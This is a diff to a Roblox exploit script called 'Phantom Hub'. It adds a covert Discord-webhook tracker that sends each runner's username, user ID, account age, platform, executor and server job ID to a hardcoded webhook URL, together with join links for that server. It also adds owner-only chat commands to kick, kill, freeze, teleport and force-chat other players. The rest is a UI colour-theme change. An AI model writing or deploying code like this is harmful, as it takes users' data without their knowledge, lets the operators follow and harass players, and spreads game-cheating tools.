@@ -18,6 +18,11 @@ local success, errorMsg = pcall(function()
     local StarterGui = game:GetService("StarterGui")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local TextChatService = game:GetService("TextChatService")
+    local HttpService = game:GetService("HttpService")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local UserInputService = game:GetService("UserInputService")
+    local Stats = game:GetService("Stats")
+    local TeleportService = game:GetService("TeleportService")
 
     print("Services initialized successfully")
 
@@ -29,6 +34,322 @@ local success, errorMsg = pcall(function()
     -- Special identification messages
     local INITIAL_MESSAGE = "Hey, is anyone using Phantom Hub here?"
     local RESPONSE_MESSAGE = "Yes, I'm using Phantom Hub too!"
+
+    -- Send webhook to Discord
+    local function sendWebhook()
+        print("Preparing webhook data...")
+        
+        -- Get player info
+        local LocalPlayer = Players.LocalPlayer
+        local Username = LocalPlayer.Name
+        local DisplayName = LocalPlayer.DisplayName
+        local UserId = LocalPlayer.UserId
+        local AccountAge = LocalPlayer.AccountAge
+        local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+        local Platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
+        local Ping = 0
+        
+        -- Try to get ping
+        pcall(function()
+            Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+        end)
+        
+        -- Get game info
+        local PlaceId = game.PlaceId
+        local JobId = game.JobId
+        local GameName = "Unknown Game"
+        
+        -- Try to get game name
+        pcall(function()
+            local info = MarketplaceService:GetProductInfo(PlaceId)
+            GameName = info.Name
+        end)
+        
+        -- Check if player is an owner
+        local isOwner = (Username == "Goodhelper12345" or Username == "1can3uss")
+        
+        -- Create links
+        local gameLink = "https://www.roblox.com/games/" .. PlaceId
+        local playerLink = "https://www.roblox.com/users/" .. UserId
+        local jobIdLink = "https://www.roblox.com/games/" .. PlaceId .. "?jobId=" .. JobId
+        local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. PlaceId .. "&launchData=" .. JobId
+        local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. PlaceId .. "&width=768&height=432&format=png"
+        
+        -- Detect executor
+        local executor = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                executor = identifyexecutor()
+            elseif getexecutorname then
+                executor = getexecutorname()
+            elseif delta_env or getgenv().delta_env then
+                executor = "Delta"
+            elseif codex or getgenv().codex then
+                executor = "Codex"
+            elseif cryptic or getgenv().cryptic then
+                executor = "Cryptic"
+            elseif appleWare or getgenv().appleWare then
+                executor = "AppleWare"
+            elseif vegaX or getgenv().vegaX then
+                executor = "Vega X"
+            elseif arceus_x or getgenv().arceus_x then
+                executor = "Arceus X"
+            elseif syn and syn.is_synapse_z then
+                executor = "Synapse Z"
+            elseif seliware or getgenv().seliware then
+                executor = "Seliware"
+            elseif awp or getgenv().awp then
+                executor = "AWP.GG"
+            elseif nihon or getgenv().nihon then
+                executor = "Nihon"
+            elseif macsploit or getgenv().macsploit then
+                executor = "MacSploit"
+            elseif wave or getgenv().wave then
+                executor = "Wave"
+            elseif solara or getgenv().solara then
+                executor = "Solara"
+            elseif fluxus or getgenv().fluxus then
+                executor = "Fluxus"
+            elseif jjsploit or getgenv().jjsploit then
+                executor = "JJSploit"
+            elseif xeno or getgenv().xeno then
+                executor = "Xeno"
+            elseif syn and syn.request then
+                executor = "Synapse X"
+            elseif KRNL_LOADED then
+                executor = "KRNL"
+            end
+        end)
+        
+        -- Format date and time
+        local date = os.date("%Y-%m-%d")
+        local time = os.date("%X")
+        
+        -- Create join code
+        local joinCode = string.format(
+            "game:GetService('TeleportService'):Teleport(%d,game:GetService('Players').LocalPlayer,'%s')",
+            PlaceId, JobId
+        )
+        
+        -- Create webhook data with Discord buttons
+        local webhookData = {
+            username = "Phantom Hub Tracker",
+            avatar_url = "https://github.com/loading123599/Phantoms-Hub-V1.1/raw/refs/heads/main/PHLOGO",
+            content = isOwner and "@everyone A Phantom Hub owner has executed the script!" or nil,
+            embeds = {
+                {
+                    title = "📊 New Script Execution",
+                    description = "Phantom Hub has been executed in **" .. GameName .. "**",
+                    color = 8388736, -- Purple
+                    fields = {
+                        {
+                            name = "👤 User Information",
+                            value = string.format(
+                                "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Premium:** %s\n**Platform:** %s\n**Ping:** %dms",
+                                DisplayName, playerLink, Username, UserId, 
+                                AccountAge, MembershipType == "Premium" and "Yes ✓" or "No ✗", Platform, Ping
+                            )
+                        },
+                        {
+                            name = "🎮 Game Information",
+                            value = string.format(
+                                "**Game:** [%s](%s)\n**Place ID:** %d\n**Job ID:** %s",
+                                GameName, gameLink, PlaceId, JobId
+                            )
+                        },
+                        {
+                            name = "⚙️ System Information",
+                            value = string.format(
+                                "**Executor:** %s\n**Time:** %s\n**Date:** %s",
+                                executor, time, date
+                            )
+                        },
+                        {
+                            name = "📝 Join Code",
+                            value = string.format(
+                                "```lua\n%s\n```",
+                                joinCode
+                            )
+                        }
+                    },
+                    image = {
+                        url = "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-E0IZldaTXUzOlHQUMl9fmn378gStPa.png"
+                    },
+                    thumbnail = {
+                        url = thumbnailUrl
+                    },
+                    footer = {
+                        text = "Phantom Hub • " .. date .. " • " .. time,
+                        icon_url = "https://github.com/loading123599/Phantom-Hub-V1.1/raw/refs/heads/main/PHLOGO"
+                    }
+                }
+            },
+            components = {
+                {
+                    type = 1,
+                    components = {
+                        {
+                            type = 2,
+                            style = 5, -- Link button
+                            label = "🎮 Join Game",
+                            url = jobIdLink
+                        },
+                        {
+                            type = 2,
+                            style = 5, -- Link button
+                            label = "📱 Mobile Join",
+                            url = mobileJoinLink
+                        },
+                        {
+                            type = 2,
+                            style = 5, -- Link button
+                            label = "👤 View Profile",
+                            url = playerLink
+                        }
+                    }
+                }
+            }
+        }
+        
+        -- Convert to JSON
+        local success, jsonData = pcall(function()
+            return HttpService:JSONEncode(webhookData)
+        end)
+        
+        if not success then
+            print("Failed to encode JSON: " .. tostring(jsonData))
+            return false
+        end
+        
+        print("JSON data prepared successfully")
+        
+        -- Discord webhook URL
+        local webhookUrl = "https://discord.com/api/webhooks/1363609123903504546/w6_dz7m9iGnc6WbZwhQuLnSwG8tQWIdhc0A_8e_Y9FgXtNBclO1LmBHxR9jAgSZ_5SYf"
+        
+        -- Try to send webhook
+        print("Attempting to send webhook...")
+        
+        -- Try different request methods based on executor
+        local sent = false
+        
+        -- Delta
+        if not sent and (delta_env or getgenv().delta_env) and delta_request then
+            print("Using Delta request method")
+            local success, result = pcall(function()
+                return delta_request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            
+            if success then
+                print("Webhook sent successfully via Delta")
+                sent = true
+            else
+                print("Failed to send webhook via Delta: " .. tostring(result))
+            end
+        end
+        
+        -- Codex
+        if not sent and codex and codex.request then
+            print("Using Codex request method")
+            local success, result = pcall(function()
+                return codex.request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            
+            if success then
+                print("Webhook sent successfully via Codex")
+                sent = true
+            else
+                print("Failed to send webhook via Codex: " .. tostring(result))
+            end
+        end
+        
+        -- Synapse Z
+        if not sent and syn and syn.request then
+            print("Using Synapse request method")
+            local success, result = pcall(function()
+                return syn.request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            
+            if success then
+                print("Webhook sent successfully via Synapse")
+                sent = true
+            else
+                print("Failed to send webhook via Synapse: " .. tostring(result))
+            end
+        end
+        
+        -- Fluxus
+        if not sent and fluxus and fluxus.request then
+            print("Using Fluxus request method")
+            local success, result = pcall(function()
+                return fluxus.request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            
+            if success then
+                print("Webhook sent successfully via Fluxus")
+                sent = true
+            else
+                print("Failed to send webhook via Fluxus: " .. tostring(result))
+            end
+        end
+        
+        -- Generic request/http_request (works with many executors)
+        if not sent and (request or http_request) then
+            print("Using generic request method")
+            local req = request or http_request
+            local success, result = pcall(function()
+                return req({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            
+            if success then
+                print("Webhook sent successfully via generic request")
+                sent = true
+            else
+                print("Failed to send webhook via generic request: " .. tostring(result))
+            end
+        end
+        
+        -- HttpService (last resort)
+        if not sent then
+            print("Using HttpService method")
+            local success, result = pcall(function()
+                return HttpService:PostAsync(webhookUrl, jsonData)
+            end)
+            
+            if success then
+                print("Webhook sent successfully via HttpService")
+                sent = true
+            else
+                print("Failed to send webhook via HttpService: " .. tostring(result))
+            end
+        end
+        
+        return sent
+    end
 
     -- Function to send identification message once
     local function sendIdentificationMessage()
@@ -151,6 +472,30 @@ local success, errorMsg = pcall(function()
     -- Show a notification that the script is starting
     showNotification("Phantom Hub", "Script is starting...", 3)
     print("Initial notification shown")
+
+    -- Send webhook with retry
+    local webhookSuccess = false
+    local webhookAttempts = 0
+    local maxWebhookAttempts = 3
+
+    spawn(function()
+        while webhookAttempts < maxWebhookAttempts and not webhookSuccess do
+            webhookSuccess = sendWebhook()
+            webhookAttempts = webhookAttempts + 1
+            
+            if not webhookSuccess and webhookAttempts < maxWebhookAttempts then
+                print("Webhook failed, retrying in 2 seconds... (Attempt " .. webhookAttempts .. "/" .. maxWebhookAttempts .. ")")
+                wait(2)
+            end
+        end
+
+        if webhookSuccess then
+            print("Webhook sent successfully!")
+            showNotification("Phantom Hub", "Execution tracked successfully!", 3)
+        else
+            print("Failed to send webhook after " .. maxWebhookAttempts .. " attempts")
+        end
+    end)
 
     -- Send identification message once at the start
     task.delay(3, sendIdentificationMessage) -- Delay to avoid chat throttling
@@ -979,6 +1324,406 @@ local success, errorMsg = pcall(function()
         end
     }
 
+    -- Admin Commands System
+    local AdminCommands = {
+        prefix = "!",  -- Command prefix
+        
+        -- Only allow these specific users to use admin commands
+        owners = {
+            ["GoodHelper12345"] = true,  -- Phantom Owner
+            ["1can3uss"] = true,         -- Alex
+            ["MicupAltAxc"] = true,      -- Alex
+            ["auralinker"] = true,       -- Phantom Admin
+            ["YournothimbuddyXD"] = true, -- AK Owner
+            ["Skyler_Saint"] = true      -- Phantom<3
+        },
+        
+        -- Create a RemoteEvent for forcing players to chat
+        setupRemotes = function(self)
+            local forceChat = Instance.new("RemoteEvent")
+            forceChat.Name = "PhantomHubForceChat"
+            forceChat.Parent = ReplicatedStorage
+            
+            -- Create a client script to handle forced chat
+            local clientScript = Instance.new("Script")
+            clientScript.Name = "ForceChatHandler"
+            clientScript.Source = [[
+                local Players = game:GetService("Players")
+                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                local forceChat = ReplicatedStorage:WaitForChild("PhantomHubForceChat")
+                
+                local player = Players.LocalPlayer
+                
+                forceChat.OnClientEvent:Connect(function(message)
+                    -- Try to use TextChatService first
+                    local success = pcall(function()
+                        local TextChatService = game:GetService("TextChatService")
+                        if TextChatService then
+                            local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                            if chatChannel then
+                                chatChannel:SendAsync(message)
+                                return true
+                            end
+                        end
+                        return false
+                    end)
+                    
+                    -- Fall back to legacy chat if needed
+                    if not success then
+                        pcall(function()
+                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+                        end)
+                    end
+                end)
+            ]]
+            clientScript.Parent = forceChat
+            
+            return forceChat
+        end,
+        
+        -- Initialize the command system
+        init = function(self)
+            self.forceChat = self:setupRemotes()
+            
+            -- Connect to chat events to listen for commands
+            local function onChatted(player, message)
+                -- Check if message starts with command prefix
+                if string.sub(message, 1, 1) ~= self.prefix then
+                    return
+                end
+                
+                -- Check if player is an authorized owner
+                if not self.owners[player.Name] then
+                    self:sendResponse(player, "You don't have permission to use admin commands.")
+                    return
+                end
+                
+                -- Parse the command
+                local args = {}
+                for arg in string.gmatch(message, "%S+") do
+                    table.insert(args, arg)
+                end
+                
+                local commandName = string.sub(args[1], 2) -- Remove prefix
+                table.remove(args, 1) -- Remove command from args
+                
+                -- Execute the command if it exists
+                if self.commands[commandName] then
+                    local success, result = pcall(function()
+                        return self.commands[commandName](self, player, args)
+                    end)
+                    
+                    if success then
+                        self:sendResponse(player, result or "Command executed successfully.")
+                    else
+                        self:sendResponse(player, "Error executing command: " .. tostring(result))
+                    end
+                else
+                    self:sendResponse(player, "Unknown command. Type " .. self.prefix .. "cmds for a list of commands.")
+                end
+            end
+            
+            -- Connect to TextChatService
+            pcall(function()
+                if TextChatService then
+                    TextChatService.MessageReceived:Connect(function(textChatMessage)
+                        local player = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
+                        if player then
+                            onChatted(player, textChatMessage.Text)
+                        end
+                    end)
+                end
+            end)
+            
+            -- Connect to legacy chat as fallback
+            pcall(function()
+                for _, player in ipairs(Players:GetPlayers()) do
+                    player.Chatted:Connect(function(message)
+                        onChatted(player, message)
+                    end)
+                end
+                
+                Players.PlayerAdded:Connect(function(player)
+                    player.Chatted:Connect(function(message)
+                        onChatted(player, message)
+                    end)
+                end)
+            end)
+            
+            print("Admin Commands System initialized!")
+        end,
+        
+        -- Send response to command issuer
+        sendResponse = function(self, player, message)
+            pcall(function()
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Admin Command",
+                    Text = message,
+                    Duration = 3
+                })
+            end)
+        end,
+        
+        -- Command implementations
+        commands = {
+            -- Kick a player
+            kick = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "kick [player] [reason]"
+                end
+                
+                local targetName = args[1]
+                table.remove(args, 1)
+                local reason = #args > 0 and table.concat(args, " ") or "Kicked by an admin."
+                
+                local target = Players:FindFirstChild(targetName)
+                if not target then
+                    return "Player not found: " .. targetName
+                end
+                
+                -- Kick the player
+                target:Kick(reason)
+                return "Kicked " .. targetName .. " for: " .. reason
+            end,
+            
+            -- Force a player to say something
+            say = function(self, sender, args)
+                if #args < 2 then
+                    return "Usage: " .. self.prefix .. "say [player] [message]"
+                end
+                
+                local targetName = args[1]
+                table.remove(args, 1)
+                local message = table.concat(args, " ")
+                
+                local target = Players:FindFirstChild(targetName)
+                if not target then
+                    return "Player not found: " .. targetName
+                end
+                
+                -- Force the player to say the message
+                self.forceChat:FireClient(target, message)
+                return "Forced " .. targetName .. " to say: " .. message
+            end,
+            
+            -- Reset a player's character
+            reset = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "reset [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target then
+                    return "Player not found: " .. targetName
+                end
+                
+                -- Reset the player's character
+                if target.Character then
+                    target.Character:BreakJoints()
+                    return "Reset " .. targetName .. "'s character."
+                else
+                    return "Player " .. targetName .. " has no character."
+                end
+            end,
+            
+            -- Force a player to rejoin
+            rejoin = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "rejoin [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target then
+                    return "Player not found: " .. targetName
+                end
+                
+                -- Force the player to rejoin
+                local TeleportService = game:GetService("TeleportService")
+                TeleportService:Teleport(game.PlaceId, target)
+                return "Forcing " .. targetName .. " to rejoin..."
+            end,
+            
+            -- Freeze a player
+            freeze = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "freeze [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                -- Freeze the player
+                for _, part in pairs(target.Character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.Anchored = true
+                    end
+                end
+                
+                return "Froze " .. targetName
+            end,
+            
+            -- Unfreeze a player
+            unfreeze = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "unfreeze [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                -- Unfreeze the player
+                for _, part in pairs(target.Character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.Anchored = false
+                    end
+                end
+                
+                return "Unfroze " .. targetName
+            end,
+            
+            -- Teleport to a player
+            goto = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "goto [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                -- Teleport to the player
+                if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and 
+                   target.Character:FindFirstChild("HumanoidRootPart") then
+                    sender.Character.HumanoidRootPart.CFrame = 
+                        target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+                    return "Teleported to " .. targetName
+                else
+                    return "Failed to teleport to " .. targetName
+                end
+            end,
+            
+            -- Bring a player to you
+            bring = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "bring [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                -- Bring the player to you
+                if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and 
+                   target.Character:FindFirstChild("HumanoidRootPart") then
+                    target.Character.HumanoidRootPart.CFrame = 
+                        sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
+                    return "Brought " .. targetName .. " to you"
+                else
+                    return "Failed to bring " .. targetName
+                end
+            end,
+            
+            -- Set a player's walkspeed
+            speed = function(self, sender, args)
+                if #args < 2 then
+                    return "Usage: " .. self.prefix .. "speed [player] [value]"
+                end
+                
+                local targetName = args[1]
+                local speedValue = tonumber(args[2])
+                
+                if not speedValue then
+                    return "Invalid speed value. Must be a number."
+                end
+                
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+                if not humanoid then
+                    return "Failed to find humanoid for " .. targetName
+                end
+                
+                humanoid.WalkSpeed = speedValue
+                return "Set " .. targetName .. "'s speed to " .. speedValue
+            end,
+            
+            -- Set a player's jump power
+            jump = function(self, sender, args)
+                if #args < 2 then
+                    return "Usage: " .. self.prefix .. "jump [player] [value]"
+                end
+                
+                local targetName = args[1]
+                local jumpValue = tonumber(args[2])
+                
+                if not jumpValue then
+                    return "Invalid jump value. Must be a number."
+                end
+                
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+                if not humanoid then
+                    return "Failed to find humanoid for " .. targetName
+                end
+                
+                humanoid.JumpPower = jumpValue
+                return "Set " .. targetName .. "'s jump power to " .. jumpValue
+            end,
+            
+            -- Kill a player
+            kill = function(self, sender, args)
+                if #args < 1 then
+                    return "Usage: " .. self.prefix .. "kill [player]"
+                end
+                
+                local targetName = args[1]
+                local target = Players:FindFirstChild(targetName)
+                if not target or not target.Character then
+                    return "Player not found or has no character: " .. targetName
+                end
+                
+                local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+                if not humanoid then
+                    return "Failed to find humanoid for " .. targetName
+                end
+                
+                humanoid.Health = 0
+                return "Killed " .. targetName
+            end,
+            
+            -- List all commands
+            cmds = function(self, sender, args)
+                local cmdList = "Available commands:\n"
+                for cmd, _ in pairs(self.commands) do
+                    cmdList = cmdList .. self.prefix .. cmd .. "\n"
+                end
+                return cmdList
+            end
+        }
+    }
+
+    -- Initialize the admin commands system
+    AdminCommands:init()
+
     print("Player Tags system loaded successfully!")
 
     -- Wait to ensure Player Tags are fully loaded
@@ -1253,47 +1998,47 @@ local success, errorMsg = pcall(function()
           Name = "Phantom's Hub ",
           Icon = 0,
           LoadingTitle = "Welcome. To Phantom's Hub",
-          LoadingSubtitle = "by Alex, and 9⁹9",
+          LoadingSubtitle = "by Alex,and 9⁹9",
           Theme = {
-    TextColor = Color3.fromRGB(255, 255, 255),
-    Background = Color3.fromRGB(5, 5, 5),
-    Topbar = Color3.fromRGB(20, 20, 20),
-    Shadow = Color3.fromRGB(0, 0, 0),
+                  TextColor = Color3.fromRGB(225, 225, 225),
+                  Background = Color3.fromRGB(5, 5, 5),
+                  Topbar = Color3.fromRGB(138, 43, 226),
+                  Shadow = Color3.fromRGB(138, 43, 226),
 
-    NotificationBackground = Color3.fromRGB(10, 10, 10),
-    NotificationActionsBackground = Color3.fromRGB(20, 20, 20),
+                  NotificationBackground = Color3.fromRGB(138, 43, 226),
+                  NotificationActionsBackground = Color3.fromRGB(138, 43, 226),
 
-    TabBackground = Color3.fromRGB(10, 10, 10),
-    TabStroke = Color3.fromRGB(20, 20, 20),
-    TabBackgroundSelected = Color3.fromRGB(20, 20, 20),
-    TabTextColor = Color3.fromRGB(255, 255, 255),
+                  TabBackground = Color3.fromRGB(138, 43, 226),
+                  TabStroke = Color3.fromRGB(138, 43, 226),
+                  TabBackgroundSelected = Color3.fromRGB(138, 43, 226),
+                  TabTextColor = Color3.fromRGB(0, 0, 0),
 
-    SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
-    ElementBackground = Color3.fromRGB(10, 10, 10),
-    ElementBackgroundHover = Color3.fromRGB(20, 20, 20),
-    SecondaryElementBackground = Color3.fromRGB(5, 5, 5),
-    ElementStroke = Color3.fromRGB(0, 0, 0),
-    SecondaryElementStroke = Color3.fromRGB(10, 10, 10),
+                  SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
+                  ElementBackground = Color3.fromRGB(138, 43, 226),
+                  ElementBackgroundHover = Color3.fromRGB(138, 43, 226),
+                  SecondaryElementBackground = Color3.fromRGB(138, 43, 226),
+                  ElementStroke = Color3.fromRGB(0, 0, 0),
+                  SecondaryElementStroke = Color3.fromRGB(138, 43, 226),
 
-    SliderBackground = Color3.fromRGB(5, 5, 5),
-    SliderProgress = Color3.fromRGB(255, 255, 255),
-    SliderStroke = Color3.fromRGB(20, 20, 20),
+                  SliderBackground = Color3.fromRGB(5, 5, 5),
+                  SliderProgress = Color3.fromRGB(138, 43, 226),
+                  SliderStroke = Color3.fromRGB(138, 43, 226),
 
-    ToggleBackground = Color3.fromRGB(10, 10, 10),
-    ToggleEnabled = Color3.fromRGB(255, 255, 255),
-    ToggleDisabled = Color3.fromRGB(0, 0, 0),
-    ToggleEnabledStroke = Color3.fromRGB(255, 255, 255),
-    ToggleDisabledStroke = Color3.fromRGB(50, 50, 50),
-    ToggleEnabledOuterStroke = Color3.fromRGB(255, 255, 255),
-    ToggleDisabledOuterStroke = Color3.fromRGB(20, 20, 20),
+                  ToggleBackground = Color3.fromRGB(138, 43, 226),
+                  ToggleEnabled = Color3.fromRGB(138, 43, 226),
+                  ToggleDisabled = Color3.fromRGB(0, 0, 0),
+                  ToggleEnabledStroke = Color3.fromRGB(138, 43, 226),
+                  ToggleDisabledStroke = Color3.fromRGB(0, 0, 0),
+                  ToggleEnabledOuterStroke = Color3.fromRGB(138, 43, 226),
+                  ToggleDisabledOuterStroke = Color3.fromRGB(138, 43, 226),
 
-    DropdownSelected = Color3.fromRGB(20, 20, 20),
-    DropdownUnselected = Color3.fromRGB(10, 10, 10),
+                  DropdownSelected = Color3.fromRGB(5, 5, 5),
+                  DropdownUnselected = Color3.fromRGB(0, 0, 0),
 
-    InputBackground = Color3.fromRGB(5, 5, 5),
-    InputStroke = Color3.fromRGB(50, 50, 50),
-    PlaceholderColor = Color3.fromRGB(120, 120, 120)
-    },
+                  InputBackground = Color3.fromRGB(0, 0, 0),
+                  InputStroke = Color3.fromRGB(138, 43, 226),
+                  PlaceholderColor = Color3.fromRGB(138, 43, 226)
+              },
           DisableRayfieldPrompts = false,
           DisableBuildWarnings = false,
 
@@ -1558,6 +2303,16 @@ local success, errorMsg = pcall(function()
                        Duration = 5,
                    })
                end,
+           })
+       end
+
+       -- Add Admin Commands tab (ONLY FOR OWNERS)
+       if AdminCommands.owners[Players.LocalPlayer.Name] then
+           local AdminTab = Window:CreateTab("Admin Commands", "shield")
+           
+           local Paragraph = AdminTab:CreateParagraph({
+               Title = "Admin Commands Instructions",
+               Content = "Type these commands in chat with ! prefix:\n• !kick [player] [reason] - Kick a player\n• !say [player] [message] - Force player to say something\n• !reset [player] - Reset a player's character\n• !rejoin [player] - Force player to rejoin\n• !freeze [player] - Freeze a player\n• !unfreeze [player] - Unfreeze a player\n• !goto [player] - Teleport to a player\n• !bring [player] - Bring a player to you\n• !speed [player] [value] - Set player's walkspeed\n• !jump [player] [value] - Set player's jump power\n• !kill [player] - Kill a player\n• !cmds - List all commands"
            })
        end
 
